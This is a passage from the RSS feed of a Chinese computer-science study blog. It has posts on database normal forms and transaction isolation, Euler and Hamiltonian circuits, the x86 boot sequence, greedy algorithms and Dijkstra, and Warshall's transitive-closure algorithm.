数据库三范式  数据库在设计表结构的时候为了减少冗余，避免在对数据进行操作时产生问题，需要遵循三范式。第一范式： 所有字段存储的都必须是最小的原子字段，不允许像结构体这样的复合结构。第二范式：所有字段必须完全 依赖于主键。如选课表(课程id，学生id，学生姓名，分数）中学生姓名没有完全依赖于主键（课程id，学生id）， 需要新建一个表（学生id，学生姓名）。否则每次存入相同学生id不同课程id的数据时都会存入相同的 学生姓名，增加了不必要的数据存储导致冗余。第三范式：所有非主键字段直接依赖于主键，不能存在传递依赖。 学生表（学生id，学院id，学院电话）中学院电话通过学院id传递依赖于主键学生id，需要拆分出（学院id，学院电话） 表。第三范式还可以用另一种形式表达：非主键间不能有依赖关系。BC范式在第三范式的基础上进一步限制 了主键间也不能有依赖。表（学生id，老师id，课程id）中，每个老师只能教一门课，每门课程可以有多个 老师，每个学生选了一门课后有对应的一名固定老师。表中三个字段都为主键，但是老师和课程之间存在依赖。   数据库事务  在对数据库进行操作的时候，我们希望有一些操作序列不可被分割，要么全部执行，要么不执行，中间没有别的 操作插入。数据库系统提供了把多条作为一个整体进行操作的功能，把这种整体称为事务。事务具有ACID特性： Atomicity原子性，Consistency一致性，Isolation隔离性，Durability持久性。原子性是我们之前说的 要么所有语句全部执行成功，要么全部不执行。一致性是指事务执行前后特定状态保持一致，如转账操作前后的 转账双方的总金额。隔离性是多个并发事务之间不能互相干扰。持久性是事务提交后的改变是持久（永久）的， 不会丢失COMMIT.
 如果我们不考虑事务的隔离性，可能会发生的情况有：
  脏读：事务在提交前的修改被读到
  不可重复读：事务内的几次查询间别的外部语句修改了数据，导致一次事务中相同的读得到不同数据
  虚读（幻读）：一个事务内对数据进行操作时别的外部语句修改了数据，导致对被修改的记录的操作失败
  不可重复读与幻读的区别是不可重复读查询同一数据项，幻读操作一批数据。
 为了提供不同场景对隔离性的需求，对于事务的隔离性定义了4中隔离级别：读未提交(read uncommitted), 读提交(read committed), 可重复读(repeatable read), 序列化(serializable). 序列化可避免脏读、不可重复读、幻读；可重复读可避免 脏读、不可重复读；读提交可避免脏读；读未提交无法保证任何情况。</description>
    </item>
    
    <item>
      <title>欧拉环路和汉密尔顿环路</title>
      <link>https://iluvata.github.io/post/2021-03-04_euler-circuit-and-hamiltonian-circuit/</link>
      <pubDate>Thu, 04 Mar 2021 17:54:59 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-03-04_euler-circuit-and-hamiltonian-circuit/</guid>
      <description>图论中有两种重要的特殊图：欧拉图和汉密尔顿图，各表示能够找到欧拉环路与汉密尔顿环路的图。 欧拉环路是由七桥问题来的：如何走过7座桥回到起点。在一般的图中，该问题可以被表示为：能不能找到 一条经过所有边，最后回到源点的环路。
 欧拉路径是比欧拉环路更广的概念。欧拉路径即图中经过所有边一次的简单路径，不要求终点和源点为 同一点。汉密尔顿路径与之类似，只是要求的不是经过所有边一次而是经过所有点一次。汉密尔顿环路 即起点与终点在同一点的汉密尔顿路径，汉密尔顿图即能找出汉密尔顿路径的图。
 对于欧拉图的判定最早由欧拉提出。方法很简单：图中每个点的度必须为偶数。判断欧拉路径的方法是 除了两个点外每个点的度数都为偶数，那两个点的度都为奇数。我们可以想象边经过一点的过程，如果 想要经过每条边一次，那每次入射一点后必定需要从另一条新的边出去。就像在一根线上串珠子的过程。 对于欧拉路径，除了头和尾两个点的度为奇数，其他都是偶数。对于欧拉环路来说头和尾是同一点， 从该点射出的路径最终还是要通过另一边回到该点。因此欧拉图所有点的度数都为偶数。
 和欧拉图不同，汉密尔顿图没有已知的多项式时间判定方法。事实上，汉密尔顿图的判定是NP完全问题。 虽然没有找到判断汉密尔顿图的充要条件，但是已知的有充分条件。n&amp;gt;=3个节点的简单图上，任意一对非 邻接节点的度数和&amp;gt;=n.或者，任意节点的度&amp;gt;=n/2.</description>
    </item>
    
    <item>
      <title>电脑是怎么启动的</title>
      <link>https://iluvata.github.io/post/2021-03-01_how-computer-startup/</link>
      <pubDate>Mon, 01 Mar 2021 22:52:59 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-03-01_how-computer-startup/</guid>
      <description>x86启动过程简介  x86计算机开机过程大致可以被分为几个阶段：
  按下开机键
  CPU跳转至BIOS物理地址
  BIOS进行开机自检
  寻找启动设备
  从MBR加载启动区
  BIOS转移控制给BootLoader
  第一阶段：硬件  BIOS  Basic Input/Output System 基本输入输出系统，被固化在ROM上的一组程序，提供最底层对硬件的控制。 也被称为固件。
UEFI  Unified Extensible Firmware Interface 统一可拓展固件接口。堆栈传参，动态链接，更大寻址。
    MBR  Master Boot Record 主引导记录。硬盘的第一个扇区，存放预启动信息、分区表信息。
    第二阶段：系统软件  Boot Loader  操作系统内核加载器。初始化硬件，建立内存空间映射。
  GRUB
  LILO
    加载内核  根据grub设定的内核映像所在路径读取，解压，放入内存。初始化函数，设备，建立Linux核心环境（初始化寄存器、堆栈）。</description>
    </item>
    
    <item>
      <title>理解贪心算法与Dijkstra算法</title>
      <link>https://iluvata.github.io/post/2021-02-24_greedy-and-dijkstra/</link>
      <pubDate>Wed, 24 Feb 2021 10:52:06 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-02-24_greedy-and-dijkstra/</guid>
      <description>贪心与动态规划  我们知道动态规划求解的问题需要具有   最优子结构   重复子问题   具有最优子结构的问题有时也可以用贪心算法求解。条件是最优解中只包含一个子问题的最优解，而一般的动态规划 最优解包含多个子问题的最优解。比如fib算法，fib(5)需要fib(4)与fib(3)两个子问题的解，无法使用贪心算法。 阶乘算法factorial(5)的递归解只需要使用一个子问题factorial(4)的解，这种情况使用贪心算法，即无需自底向上 记录每一子问题的解，只需记录当前最近一子问题的解用于求解当前解。
 一个更直观的例子是0-1背包问题和部分背包问题。背包问题要求在指定的一些商品中选出能装入背包重量的最大价值的商品 组合。0-1背包问题中的每个商品是一个整体，要么整个装入，要么不装。部分背包问题里的商品类似水或金沙，可以分割后 装入部分。0-1背包问题是典型的动态规划例子，而部分背包则可以用贪心。
 我们容易得到背包问题的最优子结构：要求重量的最优解包含了背包去掉某个物品重量后的最优解。考虑所有物品的最优解中 包含了考虑其中部分物品得到的最优解。对于0-1背包问题，通过以上两个维度我们可以列出状态转移方程：从考虑0个物品开始 依次加入每个物品，重量从0开始递增至所给背包重量；当前重量下考虑了当前加入所有物品能得到的最大价值 = max{(当前最大重量减去 当前物品重量后，不考虑当前物品能得到的最大价值 + 当前物品价值), (同等重量，不考虑当前物品能得到的最大价值),( 考虑了当前物品，最大重量-1时能得到的最大价值)}. 对于部分背包问题，如果还是使用0-1背包的方法来求解，我们会发现这次 要求的重量都是连续的，每次递增的重量无法确定。但是不妨假设我们可以每次递增无穷小的重量，就容易看出每次状态转移时， 能得到最大价值的选择一定是从剩余物品中（价值/重量）比例最大的物品中抽取加入。这样每次求最优解用到的唯一一个最优 子问题就能被确定下来，我们可以直接使用贪心算法，即，永远在剩余物品中选择（价值/重量）比例最大的物品加入，直到包 满。
 另一个例子是活动选择问题。对几个互相竞争的活动进行调度，希望找出一个最大的相互兼容活动集合。给出每个活动的开始时间与持续时长， 我们希望得到一定时间段内所能容纳的最多活动数量（多个活动间不能有重叠时间）。容易找到这个问题的最优子结构：每个活动将整体时间分为 两部分：该活动前的时间与该活动后的时间。在这两段时间内我们都需要最大化执行任务数，两段的任务数之和+1，所得的就是整个时间段的最优 解。找到最优子结构后就不难得到动态规划算法了。我们知道在这个问题的最优解中包含了两个子问题的最优解，即：活动左边时间段最优解与右边时间段 最优解。如果我们进一步观察，可以发现如果我们将选择的当前活动限制为当前时间段后开始并能最早执行完的活动，得到当前最优解所需的子问题 就只剩一个：当前活动后的时间段。可以证明该贪心选择能够得到最优解。通过一个简单的变换，我们将原来需要2个子问题的解变成了只需要1个子问题的解。 这种情况下，我们无需记录所有子问题的解来进行动态规划自底向上求解当前解，只需要记录前一子问题的解，自顶向下求解问题。
 一些能够轻易看出使用动态规划求解的问题，可以思考能不能通过变换求解过程得到贪心策略来进一步优化，给出贪心算法。
  贪心策略的基本内容  使用贪心算法需要的条件有两个：
  贪心选择性质
  最优子结构
  贪心选择性质即上文中我们说的“能找到只包含一个子问题的最优解“。通过适当的变换，一些问题可以找到贪心选择性质，如上文中的活动调度问题。 最优子结构即动态规划中的“由子问题的最优解构成当前问题最优解”的性质。满足这两个条件的问题即可使用贪心算法。但在有些情况下，不能轻易找出 最优子结构，但是问题的确可以使用贪心算法求解。比如PAT-1067.
  Dijkstra算法与Bellman-Ford算法  Dijkstra算法  作为图论中几乎是最有名的算法，Dijkstra算法解决了最短路径问题。从算法思想的角度来说，Dijkstra算法使用了贪心策略。与之相对的是 Bellman-Ford算法。同为计算最短路径的算法，Bellman-Ford算法使用了动态规划的思想，复杂度为O(n^3)。Dijkstra算法在此基础上 进一步限定条件（Bellman-Ford算法可以用来计算带有负权的图，Dijkstra只能用于权值为正数的情况）利用了问题具有贪心选择性质，用贪心策略 将最短路径算法的复杂度进一步减到了O(n^2).</description>
    </item>
    
    <item>
      <title>理解动态规划与warshall算法</title>
      <link>https://iluvata.github.io/post/2021-02-19_dp-and-warshall/</link>
      <pubDate>Fri, 19 Feb 2021 13:35:34 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-02-19_dp-and-warshall/</guid>
      <description>今天刚好在离散里学了用来计算传递闭包的warshall算法，就在这里把离散里计算闭包的算法 和动态规划一起整理一下。
集合、关系和闭包  要理解闭包首先需要了解集合和关系（函数）。 在离散数学中我们讨论的集合都是非公理化的朴素集合论（会导致罗素悖论）。有时间可以了解下公理集合论。
关系与函数  关系： 关系是一个集合中的元素到另一个集合中元素的映射方式。二元关系是两个集合笛卡尔积的子集。 关系能够具有的性质包括自反性，对称性，传递性，反自反性，反对称性。具有自反、堆成、传递性 的关系称为等价关系。其他的特殊关系有偏序（包含全序、良序、字典序）
 函数：函数可以看作一种特殊的关系。 函数是每个定义域中元素到唯一一个值域中元素的映射.
 A function from A to B is an assignment of exactly one element of B to each element of A.
 函数的种类包括
  单射 一一对应(one-to-one)函数：如果定义域中的两个元素不相等，那值域中对应的两个元素也肯定不相等.
  满射（onto）函数：值域中每个值都有对应的定义域元素.
  双射： 满足单射及满射
    闭包  闭包：一个集合具有某个性质的最小超集。例如在一个集合S上关系R的自反闭包是R并S0, S0是集合S中所有元素到自身关系的集合。 其他常用的闭包还有对称闭包和传递闭包。自反闭包记作r(R),对称闭包s(R),传递闭包t(R).
 一个关系的自反闭包与对称闭包计算都很简单，传递闭包要麻烦些。一个具有传递性的关系是指在该关系中， 如果出现了(a,b)和(b,c)，则(a,c)也存在。想得到一个关系具有传递性的最小超集，我们要检查当前该关系中所有满足(a,b) (b,c) 的pair，得到(a,c)后加入。但是只进行一次后不一定能得到我们想要的传递性关系。比如原先关系R为{(a,b), (b,c), (c,d)}, 进行一次计算后得到的R1是{(a,b), (b,c), (c,d), (a,c), (b,d)}。R1中存在(a,b)和(b,d)，但是没有(a,d)，并不是我们想要的 自反闭包。我们需要再做一次相同的步骤。在一个无穷关系中，相同的步骤需要执行无穷次。这就是计算传递闭包的算法。</description>
    </item>
    
  </channel>
</rss>
